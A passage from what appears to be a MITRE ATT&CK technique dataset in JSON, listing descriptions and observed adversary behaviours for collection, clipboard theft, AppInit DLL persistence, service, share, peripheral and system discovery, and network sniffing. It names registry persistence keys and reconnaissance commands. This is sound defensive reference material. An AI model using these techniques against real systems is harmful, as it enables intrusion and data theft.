      "developed a file stealer to search C:\\ and collect files with certain extensions.  also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server.",
      "monitors USB devices and copies files with certain extensions to\na predefined directory.",
      "executes a batch script to store discovery information in %TEMP%\\info.dat and then uploads the temporarily file to the remote C2 server.",
      "recursively generates a list of files within a directory and sends them back to the control server.",
      "saves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt .",
      "Each time a new drive is inserted,  generates a list of all files on the drive and stores it in an encrypted file.",
      "automatically collects data about the victim and sends it to the control server.",
      "has used automated collection.",
      "A  VBScript receives a batch script to execute a set of commands in a command prompt.",
      "scans processes on all victim systems in the environment and uses automated scripts to pull back the results.",
      "ran a command to compile an archive of file types of interest from the victim user's directories.",
      "automatically collects files from the local system and removable drives based on a predefined list of file extensions on a regular timeframe.",
      "monitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings.",
      "searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, *.ppt, *.xls, *.docx, *.pptx, *.xlsx). Any matching files are encrypted and written to a local user directory.",
      "For all non-removable drives on a victim,  executes automated collection of certain files for later exfiltration.",
      "has used a script to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.",
      "searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc *.ppt *.xls *.docx *.pptx *.xlsx). Any matching files are encrypted and written to a local user directory.",
      "executes an RAR tool to recursively archive files based on a predefined list of file extensions (*.xls *.xlsx *.csv *.odt *.doc *.docx *.ppt *.pptx *.pdf *.mdb *.accdb *.accde *.txt).",
      "can be used to automatically collect files from a compromised host.",
      "searches for stored credentials associated with cryptocurrency wallets and notifies the command and control server when identified.",
      "has deployed scripts on compromised systems that automatically scan for interesting documents.",
      "During  threat actors used a script to collect information about the infected system.",
      "automatically gathers data from Azure AD environments using the Azure Graph API.",
      "can automatically archive collected data.",
      "contains a module for recursively parsing through files and directories to gather valid credit card numbers.",
      "used file system monitoring to track modification and enable automatic exfiltration.",
      "can automatically gather the username domain name machine name and other information from a compromised system.",
      "used a batch script to perform a series of discovery techniques and saves it to a text file.",
      "monitors USB devices and copies files with certain extensions to a predefined directory.",
      "has the ability to index and compress files into a send queue for exfiltration.",
      "has performed frequent and scheduled data collection from victim networks.",
      "has automatically collected mouse clicks continuous screenshots on the machine and set timers to collect the contents of the clipboard and website browsing.",
      "can identify and add files that possess specific file extensions to an array for archiving.",
      "For all non-removable drives on a victim  executes automated collection of certain files for later exfiltration.",
      "has automatically collected data from USB drives keystrokes and screen images before exfiltration.",
      "can download a module to search for and build a report of harvested credential data.",
      "can automatically scan for and collect files with specific extensions.",
      "can be configured to automatically collect files under a specified directory.",
      "can enter a loop to read `/proc/` entries every 2 seconds in order to read a target application's memory.",
      "has a file searcher component that can automatically collect and archive files based on a predefined list of file extensions.",
      "can monitor files for changes and automatically collect them.",
      "has automatically collected data about the compromised system.",
      "has used a file stealer to steal documents and images with the following extensions: txt pdf png jpg doc xls xlm odp ods odt rtf ppt xlsx xlsm docx pptx and jpeg.",
      "can conduct an initial scan for Microsoft Word documents on the local system removable media and connected network drives before tagging and collecting them. It can continue tagging documents to collect with follow up scans.",
      "During  the threat actors used  to automatically gather the username domain name machine name and other system information.",
      "has used a script to iterate through a list of compromised PoS systems copy and remove data to a log file and to bind to events from the submit payment button.",
      "developed a file stealer to search C:\\ and collect files with certain extensions.  also executed a script to enumerate all drives store them as a list and upload generated files to the C2 server.",
      "has collected information automatically using the adversary's  attack.",
      "has used tools to automatically collect system and network configuration information.",
      "has used custom DLLs for continuous retrieval of data from memory.",
      "logged and stored information related to the route or hops a packet took from a compromised machine to a hardcoded C2 server including the target C2 URL HTTP response/status code HTTP response headers and values and data received from the C2 node.",
      "supports scripting of file downloads from agents.",
      "used custom batch scripts to collect files automatically from a targeted system.",
      "can sort and collect specific documents as well as generate a list of all files on a newly inserted drive and store them in an encrypted file.",
      "can automatically monitor removable drives in a loop and copy interesting files.",
      "Depending on the Linux distribution  executes a set of commands to collect device information and sends the collected information to the C2 server.",
      "can automatically collect data such as CloudFormation templates EC2 user data AWS Inspector reports and IAM credential reports.",
      "scans the system and automatically collects files with the following extensions: .doc .docx .xls .xlsx .pdf .pptx .rar .zip .jpg .jpeg .bmp .tiff .kum .tlg .sbx .cr .hse .hsf and .lhz.",
      "has used the Csvde tool to collect Active Directory files and data.",
      "can collect all the files from the working directory every three hours and place them into a password-protected archive for further exfiltration.",
      "gathered information automatically without instruction from a C2 related to the user and host machine that is compiled into a report and sent to the operators.",
      "checks two files keyword_parm.txt and parm.txt for instructions on how to target and save data parsed and extracted from SMS message data from the network traffic. If an SMS message contained either a phone number IMSI number or keyword that matched the predefined list it is saved to a CSV file for later theft by the threat actor.",
      "engages in mass collection from compromised systems during intrusions.",
      "has used batch scripts to collect data.",
      "used a custom tool sql.net4.exe to query SQL databases and then identify and extract personally identifiable information.",
      "used tools such as SQLULDR2 and PINEGROVE to gather local system and database information.",
      "delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP.",
      "collects files and directories from victim systems based on configuration data downloaded from command and control servers.",
      "collection is automatically recorded to a specified file on the victim machine.",
      "has used MSGraph to exfiltrate data from email OneDrive and SharePoint.",
      "included collection of packet capture and system configuration information.",
      "has automated collection of various information including cryptocurrency wallet details.",
      "attempts to identify and collect mail login data from Thunderbird and Outlook following execution."
    ],
    "id": "T1119",
    "name": "Automated Collection",
    "similar_words": [
      "Automated Collection"
    ]
  },
  "attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f": {
    "description": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. For example, on Windows adversaries can access clipboard data by using clip.exe or Get-Clipboard.(Citation: MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally, adversaries may monitor then replace users clipboard with their data (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citation: mining_ruby_reversinglabs)macOS and Linux also have commands, such as pbpaste, to grab clipboard contents.(Citation: Operating with EmPyre)",
    "example_uses": [
      "steals data stored in the clipboard.",
      "can retrieve the current content of the user clipboard.",
      "can steal clipboard contents.",
      "collects data stored in the clipboard.",
      "contains code to open and copy data from the clipboard.",
      "A  variant accesses a screenshot saved in the clipboard and converts it to a JPG image.",
      "The executable version of  has a module to log clipboard contents.",
      "collects data from the clipboard.",
      "contains functionality to collect information from the clipboard.",
      "copies and exfiltrates the clipboard contents every 30 seconds.",
      "can steal data from the victims clipboard.",
      "has used tools capable of stealing contents of the clipboard.",
      "can steal data from the clipboard.",
      "collects information from the clipboard by using the OpenClipboard() and GetClipboardData() libraries.",
      "can harvest clipboard data on both Windows and macOS systems.",
      "has a plugin that collects data stored in the Windows clipboard by using the OpenClipboard and GetClipboardData APIs.",
      "steals and modifies data from the clipboard.",
      "During  threat actors collected clipboard data in plaintext.",
      "had a feature to steal data from the clipboard.",
      "collects text from the clipboard.",
      "has the ability to steal data from the clipboard.",
      "has the ability to capture and store clipboard data.",
      "can download a clipboard information stealer module.",
      "has a function to hijack data from the clipboard by monitoring the contents of the clipboard and replacing the cryptocurrency wallet with the attacker's.",
      "hijacks the clipboard data by creating an overlapped window that listens to keyboard events.",
      "can extract clipboard data from a compromised host.",
      "can capture clipboard data from a compromised host.",
      "can capture clipboard data.",
      "has a function to use the OpenClipboard wrapper.",
      "used a Trojan called KEYLIME to collect data from the clipboard.",
      "starts a thread on execution that captures clipboard data and logs it to a predefined log file.",
      "can hook GetClipboardData function to watch for clipboard pastes to collect.",
      "can monitor content saved to the clipboard.",
      "has the ability to capture and replace Bitcoin wallet data in the clipboard on a compromised host.",
      "can collect clipboard data.",
      "can capture clipboard content.",
      "has the ability to steal data from the clipboard of an infected host.",
      "can monitor Clipboard text and can use `System.Windows.Forms.Clipboard.GetText()` to collect data from the clipboard.",
      "can capture content from the clipboard.",
      "can collect data stored in the victim's clipboard.",
      "has used infostealer tools to copy clipboard data."
    ],
    "id": "T1115",
    "name": "Clipboard Data",
    "similar_words": [
      "Clipboard Data"
    ]
  },
  "attack-pattern--317fefa6-46c7-4062-adb6-2008cf6bcb41": {
    "description": "Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows or HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Endgame Process Injection July 2017) Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry)\n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",
    "example_uses": [
      "Some variants of  use AppInit_DLLs to achieve persistence by creating the following Registry key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows \"AppInit_DLLs\"=\"pserver32.dll\"",
      "If a victim meets certain criteria,  uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs – %APPDATA%\\Intel\\ResN32.dll and HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs – 0x1."
    ],
    "id": "T1103",
    "name": "AppInit DLLs",
    "similar_words": [
      "AppInit DLLs"
    ]
  },
  "attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa": {
    "description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as sc query, tasklist /svc, systemctl --type=service, and net start.Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "example_uses": [
      "collects a list of running services with the command tasklist /svc.",
      "enumerates all running services.",
      "runs the command: net start >> %TEMP%\\info.dat on a victim.",
      "has a feature to list the available services on the system.",
      "uses tasklist /svc to display running tasks.",
      "collects a list of install programs and services on the system’s machine.",
      "can obtain running services on the victim.",
      "creates a backdoor through which remote attackers can monitor services.",
      "can list running services.",
      "can enumerate services.",
      "has used sc query on a victim to gather information about services.",
      "queries the system to identify existing services.",
      "can query service configuration information.",
      "executes net start after initial communication is made to the remote server.",
      "runs the command net start on a victim.",
      "collects information on programs and services on the victim that are configured to automatically run at startup.",
      "has the ability to discover and manipulate Windows services.",
      "The net start command can be used in  to find information about Windows services.",
      "has the capability to execute the command net start to interact with services.",
      "may use net start to display running services.",
      "can be used to discover services running on a system.",
      "After compromising a victim,  discovers all running services.",
      "actors used the following command following exploitation of a machine with  malware to obtain information about services: net start >> %temp%\\download",
      "surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command.",
      "performs service discovery using net start commands.",
      "has gathered information about running services.",
      "has used TROJ_GETVERSION to discover system services.",
      "can collect a list of services on a victim machine.",
      "has searched for services such as Alibaba Cloud Security's aliyun service and BMC Helix Cloud Security's bmc-agent service in order to disable them.",
      "can enumerate service and service permission information.",
      "has used the win32_service WMI class to retrieve a list of services from the system.",
      "has the capability to enumerate services.",
      "can list local services.",
      "can create and register a service for execution.",
      "can enumerate services on compromised hosts.",
      "can enumerate services on the victim machine.",
      "can check if it is running as a service on a compromised host.",
      "has attempted to discover services for third party EDR products.",
      "After compromising a victim  discovers all running services.",
      "has used an instrumentor script to gather the names of all services running on a victim's system.",
      "can obtain a list of the services from a system.",
      "has used net start and net use for system service discovery.",
      "enumerates all Windows services.",
      "collected a list of service names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.",
      "can list all services and their configurations.",
      "can check whether the service name FAX is present.",
      "can enumerate active services.",
      "can query service status using QueryServiceStatusEx function.",
      "has the ability to execute the `net start` command.",
      "has the ability to retrieve a list of services on the infected host.",
      "has used  to obtain information from a compromised host.",
      "During  threat actors used the `tasklist` command to search for one of its backdoors.",
      "can retrieve information about a compromised system's running services.",
      "can enumerate all services running on a compromised host.",
      "can enumerate services on a victim machine.",
      "uses the tasklist /svc command to list the services on the system.",
      "can enumerate existing Windows services on the host that are configured to run as LocalSystem.",
      "collects a list of install programs and services on the systems machine.",
      "During  the threat actors used the `net start` command as part of their initial reconnaissance.",
      "has the ability to identify running services on a compromised host.",
      "used the commands net start and tasklist to get a listing of the services on the system.",
      "can check the services on the system.",
      "can search for modifiable services that could be used for privilege escalation.",
      "has used `net start` to list running services.",
      "can check whether the service name `FAX` is present."
    ],
    "id": "T1007",
    "name": "System Service Discovery",
    "similar_words": [
      "System Service Discovery"
    ]
  },
  "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529": {
    "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.Network sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)On network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
    "example_uses": [
      "deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.",
      "captures hashes and credentials that are sent to the system after the name services have been poisoned.",
      "appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB.",
      "has used intercepter-NG to sniff passwords in network traffic.",
      "has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols.",
      "can be used to sniff network traffic via an interface or raw socket.",
      "can dump and print whole packet content.",
      "uses the libpcap library to listen to all traffic and parses network protocols starting with Ethernet and IP layers. It continues parsing protocol layers including SCTP SCCP and TCAP and finally extracts SMS message data and routing metadata.",
      "During the   used s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grids industrial control systems.",
      "can sniff network traffic to look for packets matching specific conditions.",
      "can configure custom listeners to passively monitor all incoming HTTP GET and POST requests sent to the AD FS server from the intranet/internet and intercept HTTP requests that match the custom URI patterns defined by the actor.",
      "can be used to conduct packet captures on target hosts.",
      "has been observed to hook network APIs to monitor network traffic.",
      "has used SniffPass to collect credentials by sniffing network traffic.",
      "used network sniffing to obtain login data.",
      "deployed the open source tool Responder to conduct NetBIOS Name Service poisoning which captured usernames and hashed passwords that allowed access to legitimate credentials.  close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials.",
      "contains a module for taking packet captures on compromised hosts.",
      "appears to have functionality to sniff for credentials passed over HTTP SMTP and SMB.",
      "hooked the Catalina application filter chain `doFilter` on compromised systems to monitor all inbound requests to the local Tomcat web server inspecting them for parameters like passwords and follow-on Java modules.",
      "has the ability to perform packet capture on remote devices via actor-defined jump-hosts.",
      "has used a custom tool VELVETTAP to perform packet capture from compromised F5 BIG-IP devices.",
      "has used a variety of tools and techniques to capture packet data between network interfaces.",
      "included network packet capture and sniffing for data collection in victim environments.",
      "can use the libpcap library to monitor captured packets for specifc sequences.",
      "can create and exfiltrate packet captures from compromised environments.",
      "has a pcap listener function that can create an Extended Berkley Packet Filter (eBPF) on designated interfaces and ports."
    ],
    "id": "T1040",
    "name": "Network Sniffing",
    "similar_words": [
      "Network Sniffing"
    ]
  },
  "attack-pattern--327f3cc5-eea1-42d4-a6cd-ed34b7ce8f61": {
    "description": "Adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.\n\nAccess to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.",
    "example_uses": [
      "compromised McAfee ePO to move laterally by distributing malware as a software deployment task."
    ],
    "id": "T1017",
    "name": "Application Deployment Software",
    "similar_words": [
      "Application Deployment Software"
    ]
  },
  "attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f": {
    "description": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the net view \\\\\\\\remotesystem command. It can also be used to query shared drives on the local system using net share. For macOS, the sharing -l command lists all shared points used for smb services.",
    "example_uses": [
      "identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.",
      "can gather network share information.",
      "collects a list of network shares with the command net share.",
      "can scan local network for open SMB.",
      "has the capability to retrieve information about shares on remote hosts.",
      "can list local and remote shared drives and folders over SMB.",
      "listed remote shared drives that were accessible from a victim.",
      "can query shared drives on the local system.",
      "discovers shares on the network",
      "The net view \\\\remotesystem and net share commands in  can be used to find shared drives and directories on remote and local systems respectively.",
      "can check a user's access to the C$ share on a compromised machine.",
      "can scan for network drives which may contain documents for collection.",
      "During  the threat actors executed the PowerView ShareFinder module to identify open shares.",
      "can enumerate remote open SMB network shares using NetShareEnum().",
      "has used tools such as  to enumerate network shares.",
      "can enumerate shared drives on the domain.",
      "can discover shared resources using the NetShareEnum API call.",
      "can use net share to identify network shares for use in lateral movement.",
      "has used the post exploitation tool  to enumerate network shares.",
      "can enumerate shares on a compromised host.",
      "has a `ENMDSKS` command to enumerates available network shares.",
      "scanned the network for public shared folders.",
      "used the net view command to show all shares available including the administrative shares such as C$ and ADMIN$.",
      "can enumerate network shares and mounted drives on a network.",
      "has enumerated non-hidden network shares using `WNetEnumResourceW`.",
      "used the net share command as part of network reconnaissance.",
      "has the ability to execute the `net view` command.",
      "has a module to enumerate network shares.",
      "can enumerate the shared folders and associated permissions for a targeted network.",
      "can search for network shares on the domain or workgroup using net view <host>.",
      "can find shared drives on the local system.",
      "has used net share and net view to identify network shares of interest.",
      "enumerates open SMB shares on internal victim networks.",
      "module shareDll/mshareDll discovers network shares via the WNetOpenEnumA API.",
      "During  threat actors discovered network disks mounted to the system using .",
      "can use  and  to discover network shares.",
      "can identify remote file shares for encryption.",
      "has enumerated network shares on a compromised host.",
      "can enumerate the shared resources of a given IP addresses using the API call `NetShareEnum`.",
      "can enumerate connected remote logical drives.",
      "has the ability to enumerate network resources.",
      "has the ability to enumerate network shares.",
      "has the ability to discover network shares on compromised networks.",
      "has enumerated shared folders and mapped volumes.",
      "has been used to execute `net view` to discover mapped network shares.",
      "can enumerate network shares.",
      "has executed net view commands for enumeration of open shares on compromised machines.",
      "used netview to scan target systems for shared resources.",
      "can identify network adjacent and accessible drives.",
      "will attempt to enumerate mapped network shares to later attempt to wipe all files on those shares.",
      "enumerates the directories of a network resource.",
      "can enumerate connected drives for infected host machines.",
      "has identified and browsed file servers in the victim network sometimes viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.",
      "has enumerated shared drives on a compromised network.",
      "During  the threat actors used the `net share` command as part of their advanced reconnaissance.",
      "listed connected network shares.",
      "identifies network drives when they are added to victim systems.",
      "has used the net view command to locate mapped network shares.",
      "has the ability to use loop operations to enumerate network resources.",
      "can identify and search networked drives for specific file name extensions.",
      "can run `C:\\Windows\\System32\\cmd.exe /c net view /all` to discover network shares.",
      "can identify shared resources in compromised environments.",
      "has the ability to check for shared network drives to encrypt.",
      "has used the `net view /all` command to show available shares.",
      "has used Internet Explorer to view folders on other systems.",
      "can identify and enumerate victim system network shares.",
      "can identify network shares connected to the victim machine.",
      "can discover remote shares.",
      "can identify network shares on compromised systems.",
      "scanned and enumerated remote network shares in victim environments during .",
      "enumerated network shares on victim devices.",
      "has the ability to target specific network shares for encryption."
    ],
    "id": "T1135",
    "name": "Network Share Discovery",
    "similar_words": [
      "Network Share Discovery"
    ]
  },
  "attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643": {
    "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
    "example_uses": [
      "searches through connected drives for removable storage devices.",
      "obtains the number of removable drives from the victim.",
      "checks for new hard drives on the victim, such as USB devices, by listening for the WM_DEVICECHANGE window message.",
      "can list connected devices.",
      "can gather very specific information about attached USB devices, to include device instance ID and drive geometry.",
      "can obtain a list of smart card readers attached to the victim.",
      "monitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system.",
      "A module in  collects information on available printers and disk drives.",
      "contains the showBackupIosFolder function to check for IOS device backups by running ls -la ~/Library/Application\\ Support/MobileSync/Backup/.",
      "tools contained an application to check performance of USB flash drives.",
      "has used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware.",
      "uses a module to receive a notification every time a USB mass storage device is inserted into a victim.",
      "During  the threat actors used the `fsutil fsinfo drives` command as part of their advanced reconnaissance.",
      "has a Bluetooth device harvester which uses Windows Bluetooth APIs to find information on connected Bluetooth devices.",
      "can map UPnP ports.",
      "can monitor for removable drives being plugged into the compromised machine.",
      "The  FilepakMonitor component can detect removable drive insertion.",
      "will attempt to detect if the victim system has a camera during the initial infection.  can also detect any removable drives connected to the system.",
      "can identify removable media attached to compromised hosts.",
      "contains a thread that will attempt to scan for new attached drives every few seconds. If one is identified it will encrypt the files on the attached device.",
      "enumerates information about connected storage devices.",
      "can discover pluggable/removable drives to extract files from.",
      "can detect USB devices.",
      "can scan for removable media which may contain documents for collection.",
      "can check for connected USB devices.",
      "can detect connected USB devices.",
      "has a plugin that collects information about inserted storage devices modems and phone devices.",
      "can check for the number of devices plugged into an infected host.",
      "can run GET.WORKSPACE in Microsoft Excel to check if a mouse is present.",
      "can gather very specific information about attached USB devices to include device instance ID and drive geometry.",
      "has used fsutil fsinfo drives to list connected drives.",
      "has used tools to identify if a mouse is connected to a targeted system.",
      "has the ability to discover pluggable/removable drives to extract files from.",
      "enumerates removable drives for infection.",
      "will attempt to detect if a usable smart card is current inserted into a card reader.",
      "can enumerate removable drives prior to the encryption process.",
      "can identify and search removable drives for specific file name extensions.",
      "can identify peripheral devices on targeted systems.",
      "During  threat actors discovered removable disks attached to a system.",
      "detects the insertion of new devices by listening for the WM_DEVICECHANGE window message.",
      "has searched for attached VGA devices using lspci.",
      "has the ability to monitor removable drives.",
      "tools have contained an application to check performance of USB flash drives.  has also used malware to scan for removable drives.",
      "has used an executable to detect removable media such as USB flash drives.",
      "can identify removable media attached to victim's machines.",
      "has the ability to steal information about printers and the documents sent to printers.",
      "may attempt to connect to removable drives and mapped network drives.",
      "has the ability to identify connected Apple devices.",
      "has dropped a plugin to monitor external drives to `C:\\Users\\Public\\It3.exe`.",
      "can scan for removable media to collect data.",
      "monitors victims for insertion of removable drives. When dropped onto a second victim it also enumerates drives connected to the system.",
      "checks for new hard drives on the victim such as USB devices by listening for the WM_DEVICECHANGE window message.",
      "can list signed PnP drivers for smartcard readers.",
      "can identify external USB and hard drives for encryption and printers to print ransom notes.",
      "can monitor for removable drives.",
      "can identify removable drives attached to the victim's machine.",
      "has obtained victim's screen dimension and display device information.",
      "includes functionality to identify MMC and SD cards connected to the victim device.",
      "has the ability to identify mounted external storage devices.",
      "has the ability to discover external storage devices."
    ],
    "id": "T1120",
    "name": "Peripheral Device Discovery",
    "similar_words": [
      "Peripheral Device Discovery"
    ]
  },
  "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1": {
    "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. show version).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get`, `system version get`, and `storage filesystem list` (to list storage volumes).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)[System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques) ",
    "example_uses": [
      "gathers computer name and information using the systeminfo command.",
      "collects the computer name and host name on the compromised system.",
      "checks if the victim OS is 32 or 64-bit.",
      "collects the OS version and computer name.",
      "collects the OS name, machine name, and architecture information.",
      "collects hard drive content and system configuration information.",
      "gathers computer names, OS version info, and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.",
      "can gather the disk volume information.",
      "collected system architecture information.  used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.",
      "collects the computer name, the BIOS model, and execution path.",
      "collects the hostname of the victim machine.",
      "collects endpoint information using the systeminfo command.",
      "has the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start.",
      "collects the OS version, country name, MAC address, computer name, physical memory statistics, and volume information for all drives on the system.",
      "checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks.",
      "gathers information on the system and local drives.",
      "has a command to gather system information from the victim’s machine.",
      "can gather information on the mapped drives, OS version, computer name, and memory size.",
      "gathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name.",
      "gathers system information, network addresses, disk type, disk free space, and the operation system version.",
      "uses systeminfo on a victim’s machine.",
      "collects general system enumeration data about the infected machine and checks the OS version.",
      "gathers the computer name, the serial number of the main disk volume, CPU information, Microsoft Windows version, and runs the command systeminfo.",
      "collects the MAC address, computer name, and CPU information.",
      "collects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commands systeminfo, net config workstation, hostname, ver, set, and date /t.",
      "can collect CPU and architecture information from the victim’s machine.",
      "gathers information about the OS architecture, OS name, and OS version/Service pack.",
      "gathers the OS version, CPU type, amount of RAM available from the victim’s machine.",
      "has the capability to gather the system’s hostname and OS version.",
      "gathers the OS version, logical drives information, processor information, and volume information.",
      "has a command to gather system information from the victim’s machine.",
      "collects the computer name and serial number for the storage volume C:\\.",
      "collects the victim’s computer name, processor architecture, OS version, and volume serial number.",
      "has the capability to gather the OS version and computer name.",
      "obtains the victim computer name and encrypts the information to send over its C2 channel.",
      "gathers volume drive information and system information.",
      "gathers the computer name and checks the OS version to ensure it doesn’t run on a Windows XP or Windows Server 2003 systems.",
      "can retrieve OS name/architecture and computer/domain name information from compromised hosts.",
      "can discover and collect victim system information.",
      "can collect system information.",
      "can collect system information.",
      "creates a backdoor through which remote attackers can retrieve information such as hostname and free disk space.",
      "can obtain system information such as OS version and disk space.",
      "creates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed.",
      "can gather the victim OS version and whether it is 64 or 32 bit.",
      "creates a backdoor through which remote attackers can retrieve system information.",
      "can identify system information, including battery status.",
      "can grab a system’s information including the OS version, architecture, etc.",
      "collects a unique identifier (UID) from a compromised host.",
      "can gather information about the host.",
      "collects and sends system information to its C2.",
      "gathers the victim's computer name, Windows version, and system language, and then sends it to its C2 server.",
      "is capable of gathering system information.",
      "can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path.",
      "has the capability to retrieve information about the OS.",
      "can gather the victim computer name and serial number.",
